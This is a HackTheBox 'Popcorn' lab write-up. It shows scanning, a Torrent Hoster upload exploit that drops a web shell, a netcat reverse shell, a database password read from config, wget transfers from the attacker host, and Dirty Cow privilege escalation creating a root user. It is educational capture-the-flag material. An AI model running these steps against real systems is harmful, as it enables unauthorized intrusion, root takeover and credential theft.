---
layout: page
title: Popcorn
description: Popcorn from HackTheBox.
img: 
importance: 3
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/popcorn/logo.png" title="HTB Popcorn Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/Popcorn/Popcorn">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Working on another retired oldie.  Let's get to it.

As per the usual, run nmap to get the open ports that we can investigate.

{% raw %}
```sh
└──╼ [★]$ nmap -sC -sV -O -A -oN nmap 10.10.10.6
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 08:53 CST
Nmap scan report for 10.10.10.6
Host is up (0.098s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12
|_http-title: Did not follow redirect to http://popcorn.htb/
|_http-server-header: Apache/2.2.12 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/17%OT=22%CT=1%CU=37373%PV=Y%DS=2%DC=T%G=Y%TM=678A
OS:6F07%P=x86_64-pc-linux-gnu)SEQ(SP=CD%GCD=1%ISR=CD%TI=Z%CI=Z%II=I%TS=8)OP
OS:S(O1=M53CST11NW6%O2=M53CST11NW6%O3=M53CNNT11NW6%O4=M53CST11NW6%O5=M53CST
OS:11NW6%O6=M53CST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)EC
OS:N(R=Y%DF=Y%T=40%W=16D0%O=M53CNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M53CST11NW6%RD
OS:=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%
OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   97.95 ms 10.10.14.1
2   98.05 ms 10.10.10.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.89 seconds
```
{% endraw %}

<br />
Run nmap against all ports just to confirm that there are no weird ports running.

{% raw %}
```sh
└──╼ [★]$ nmap -sC -sV -O -A -oN nmap 10.10.10.6
└──╼ [★]$ sudo nmap -sS -p- -oN nmapfull 10.10.10.6
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 08:54 CST
Nmap scan report for 10.10.10.6
Host is up (0.098s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.84 seconds
```
{% endraw %}

<br />
Noticing the redirect in the nmap output, add popcorn.htb to the /etc/hosts file.

{% raw %}
```sh
└──╼ [★]$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	debian12-parrot
10.10.10.6 popcorn.htb
```
{% endraw %}

<br />
Check the landing page for the web server and view its source.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/popcorn/landing.png" title="View the landing page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

{% raw %}
```html
view-source:http://popcorn.htb/

<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
</body></html>
```
{% endraw %}

<br />
Use ffuf to fuzz and brute-force directories that are hopefully more interesting the It works! page.

{% raw %}
```bash
└──╼ [★]$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://popcorn.htb/FUZZ -fw 22

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://popcorn.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 22
________________________________________________

test                    [Status: 200, Size: 47400, Words: 2478, Lines: 655, Duration: 110ms]
torrent                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 97ms]
rename                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 97ms]
:: Progress: [220560/220560] :: Job [1/1] :: 408 req/sec :: Duration: [0:09:18] :: Errors: 1 ::
```
{% endraw %}

<br />
Investigate the /test folder and notice that it is the phpinfo() page.

{% raw %}
```bash
PHP Version 5.2.10-2ubuntu6.10

System 	Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686

<snip>
```
{% endraw %}

<br />
Check the /rename folder.  It seem to describe how to use the Renamer API.  Might be interesting if we can't find something more useful.  Or a rabbit hole.  Anyway.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/popcorn/rename.png" title="View the rename page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the /torrent directory.  Looks like some sort of torrent repository program.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/popcorn/torrent.png" title="Torrent Hoster" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the searchsploit for this torrent hoster program.

{% raw %}
```bash
└──╼ [★]$ searchsploit torrent hoster
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Torrent Hoster - Remount Upload                                                                                                                             | php/webapps/11746.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
{% endraw %}

<br />
Search online for an exploit that we can use.  Come across this GitHub repository.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/popcorn/repo.png" title="Exploit Repository" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/Anon-Exploiter/exploits/blob/master/torrent_hoster_unauthenticated_rce.py">Repository</a>

<br />
Start a netcat listener.

{% raw %}
```bash
└──╼ [★]$ sudo nc -nlvp 443
listening on [any] 443 ...
```
{% endraw %}

<br />
Download a copy to the local working folder.  Update the script as there is a format function attached to print funtion instead of the string inside the function.

{% raw %}
```python
#!/usr/bin/env python

<snip>

def parseTorrents(url):
	print("[#] Browsing torrents on the website")
	request 	= requests.get(url + "index.php?mode=directory").text
	soup 		= BeautifulSoup(request, 'html.parser').find_all('td', {'align': 'left', 'width': '300'})

	if len(soup) == 0:
		exit("[!] Dang; Better luck next time!\n```\nNo torrents found on the website!\n```")

	torrents 	= []

	print("[~] Found the following torrents with IDs:\n```")
	for elements in soup[::-1]: # Reverse The List -- Select the last possible torrent to overwrite4
		# print(elements)
		tId 	= elements.a['href'].split("=")[::-1][0]
		path 	= url + "upload_file.php?mode=upload&id=" + tId
		print(tId)
		torrents.append(path)

	print("```")
	print("\n[$] Selecting the last possible torrent({}) to upload screenshot to!".format(torrents[0].split("=")[::-1][0]))
	return(torrents[0])

<snip>
```
{% endraw %}

<br />
Run the exploit.

{% raw %}
```bash
└──╼ [★]$ python rce.py --url=http://popcorn.htb/torrent/

<snip>

[#] Browsing torrents on the website
[~] Found the following torrents with IDs:

<snip>

[$] Selecting the last possible torrent(d042db4335a8c8884da040e3ab4dc2df6c3efcea) to upload screenshot to!
[#] Uploading WebShell

[$] Whoa, we got a shell dude! Spawning Console!!!
[&] Shell Uploaded: http://popcorn.htb/torrent//upload/d042db4335a8c8884da040e3ab4dc2df6c3efcea.php?c=
.
.
.
.
.
Traceback (most recent call last):
  File "/home/biscottidiskette/my_data/machines/popcorn/rce.py", line 151, in <module>
    main()
  File "/home/biscottidiskette/my_data/machines/popcorn/rce.py", line 137, in main
    accessShell(args.url, path)
  File "/home/biscottidiskette/my_data/machines/popcorn/rce.py", line 114, in accessShell
    command 	= raw_input("$ ")
               ^^^^^^^^^
NameError: name 'raw_input' is not defined
```
{% endraw %}

<br />
Notice the error in the output.  Navigate to the url indicated in the Shell Uploaded: line.  For the c= parameter, use whoami to test remote code execution.

<a href="http://popcorn.htb/torrent//upload/d042db4335a8c8884da040e3ab4dc2df6c3efcea.php?c=whoami">http://popcorn.htb/torrent//upload/d042db4335a8c8884da040e3ab4dc2df6c3efcea.php?c=whoami</a>
<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/popcorn/testrce.png" title="Test the RCE" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use revshells to generate a reverse shell.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/popcorn/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.revshells.com/">Revshells</a>

<br />
Update the c parameter with the payload from revshells.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/popcorn/crevshell.png" title="Attack!!!" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the listener and catch the shell.  Use the python to upgrade the shell.

{% raw %}
```bash
└──╼ [★]$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.6] 42132
python -c 'import pty; pty.spawn("/bin/bash");'
www-data@popcorn:/var/www/torrent/upload$ 
```
{% endraw %}

<br />
Check the config.php file to get a potential password.

{% raw %}
```php
<?php

<snip>

  //Edit This For TORRENT HOSTER Database
  //database configuration
  $CFG->host = "localhost";
  $CFG->dbName = "torrenthoster";	//db name
  $CFG->dbUserName = "torrent";    //db username
  $CFG->dbPassword = "SuperSecret!!";	//db password

?>
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
www-data@popcorn:/home/george$ cat user.txt
cat user.txt
<redacted>
www-data@popcorn:/home/george$ /sbin/ifconfig
/sbin/ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:46:bf  
          inet addr:10.10.10.6  Bcast:10.10.11.255  Mask:255.255.254.0
          inet6 addr: dead:beef::250:56ff:feb9:46bf/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:46bf/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2570 errors:0 dropped:0 overruns:0 frame:0
          TX packets:548 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:295981 (295.9 KB)  TX bytes:430602 (430.6 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:96 errors:0 dropped:0 overruns:0 frame:0
          TX packets:96 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:14520 (14.5 KB)  TX bytes:14520 (14.5 KB)
```
{% endraw %}

<br />
Run uname -a to get the version of Linux.

{% raw %}
```bash
www-data@popcorn:/dev/shm$ uname -a
uname -a
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
```
{% endraw %}

<br />
This version of Linux is vulnerable to Dirty Cow privilege escalation exploit.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/popcorn/dirtycow.png" title="Dirty Cow" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/exploits/40839">Exploit-DB</a>

<br />
Download the dirty payload.

{% raw %}
```bash
└──╼ [★]$ wget https://www.exploit-db.com/raw/40839 -O dirty.c
--2025-01-17 18:07:07--  https://www.exploit-db.com/raw/40839
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5006 (4.9K) [text/plain]
Saving to: ‘dirty.c’

dirty.c                                         100%[=====================================================================================================>]   4.89K  --.-KB/s    in 0s      

2025-01-17 18:07:09 (102 MB/s) - ‘dirty.c’ saved [5006/5006]
```
{% endraw %}

<br />
Compile the exploit.

{% raw %}
```bash
└──╼ [★]$ gcc -pthread dirty.c -o dirty -lcrypt
```
{% endraw %}

<br />
Transfer the compiled exploit to the victim machine.

{% raw %}
```bash
www-data@popcorn:/dev/shm$ wget http://10.10.14.29:8000/dirty
wget http://10.10.14.29:8000/dirty
--2025-01-18 02:10:33--  http://10.10.14.29:8000/dirty
Connecting to 10.10.14.29:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17512 (17K) [application/octet-stream]
Saving to: `dirty'

100%[======================================>] 17,512      --.-K/s   in 0.1s    

2025-01-18 02:10:33 (179 KB/s) - `dirty' saved [17512/17512]

www-data@popcorn:/dev/shm$ chmod +x dirty
chmod +x dirty
```
{% endraw %}

<br />
Try to run the exploit and notice the error.

{% raw %}
```bash
www-data@popcorn:/dev/shm$ ./dirty
./dirty
bash: ./dirty: cannot execute binary file
```
{% endraw %}

<br />
Transfer the dirty.c source file to the victim machine.

{% raw %}
```bash
www-data@popcorn:/dev/shm$ wget http://10.10.14.29:8000/dirty.c -O dirty.c
wget http://10.10.14.29:8000/dirty.c -O dirty.c
--2025-01-18 02:13:55--  http://10.10.14.29:8000/dirty.c
Connecting to 10.10.14.29:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5006 (4.9K) [text/x-csrc]
Saving to: `dirty.c'

100%[======================================>] 5,006       --.-K/s   in 0s      

2025-01-18 02:13:55 (396 MB/s) - `dirty.c' saved [5006/5006]
```
{% endraw %}

<br />
Compile the source code on the victim machine.

{% raw %}
```bash
www-data@popcorn:/dev/shm$ gcc -pthread dirty.c -o dirty -lcrypt
gcc -pthread dirty.c -o dirty -lcrypt
```
{% endraw %}

<br />
Run the dirty executable.

{% raw %}
```bash
www-data@popcorn:/dev/shm$ gcc -pthread dirty.c -o dirty -lcrypt
gcc -pthread dirty.c -o dirty -lcrypt
www-data@popcorn:/dev/shm$ ./dirty
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: firefart

Complete line:
firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash

mmap: b789e000
```
{% endraw %}

<br />
Ssh in the victim as the new firefart user that was created by the Dirty Cow.

{% raw %}
```bash
└──╼ [★]$ ssh -oHostKeyAlgorithms=+ssh-dss firefart@10.10.10.6
firefart@10.10.10.6's password: 
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/

  System information as of Sat Jan 18 02:18:54 EET 2025

  System load: 3.06              Memory usage: 7%   Processes:       124
  Usage of /:  32.6% of 3.56GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at https://landscape.canonical.com/

Last login: Tue Nov 21 19:24:41 2023 from 10.10.14.23
firefart@popcorn:~#
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
firefart@popcorn:~# cat /root/root.txt
<redacted>
firefart@popcorn:~# ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:46:bf  
          inet addr:10.10.10.6  Bcast:10.10.11.255  Mask:255.255.254.0
          inet6 addr: dead:beef::250:56ff:feb9:46bf/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:46bf/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3958 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1255 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1266175 (1.2 MB)  TX bytes:495545 (495.5 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:96 errors:0 dropped:0 overruns:0 frame:0
          TX packets:96 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:14520 (14.5 KB)  TX bytes:14520 (14.5 KB)
```
{% endraw %}

<br />
Sweet, delicious popcorn.